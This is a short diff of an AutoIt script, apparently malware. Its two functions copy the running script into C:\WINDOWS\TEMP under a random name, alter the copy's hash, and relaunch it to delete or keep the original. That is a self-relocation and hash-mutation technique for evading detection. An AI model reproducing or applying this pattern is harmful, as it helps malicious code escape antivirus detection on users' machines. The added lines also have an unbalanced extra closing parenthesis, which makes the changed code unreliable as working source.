@@ -199,7 +199,7 @@ Func MoveAndRunAgain($folder = "C:\WINDOWS\TEMP", $newName = RandomString())
    Else
 	  FileCopy(@ScriptDir & "\" & @ScriptName, $folder & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
 	  changeHASH($folder & "\" & $newName)
-	  RunWait($folder & "\" & $newName & " " & "delete_previous" & " " & @ScriptDir & "\" & @ScriptName);
+	  RunWait($folder & "\" & $newName & " " & "delete_previous" & " " & FileGetShortName(@ScriptDir & "\" & @ScriptName)));
    EndIf
 EndFunc
 
@@ -209,7 +209,7 @@ Func CopyAndRunAgain($folder = "C:\WINDOWS\TEMP", $newName = RandomString())
    Else
 	  FileCopy(@ScriptDir & "\" & @ScriptName, $folder & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
 	  changeHASH($folder & "\" & $newName)
-	  RunWait($folder & "\" & $newName & " " & "keep_previous" & " " & @ScriptDir & "\" & @ScriptName);
+	  RunWait($folder & "\" & $newName & " " & "keep_previous" & " " & FileGetShortName(@ScriptDir & "\" & @ScriptName)));
    EndIf
 EndFunc
 
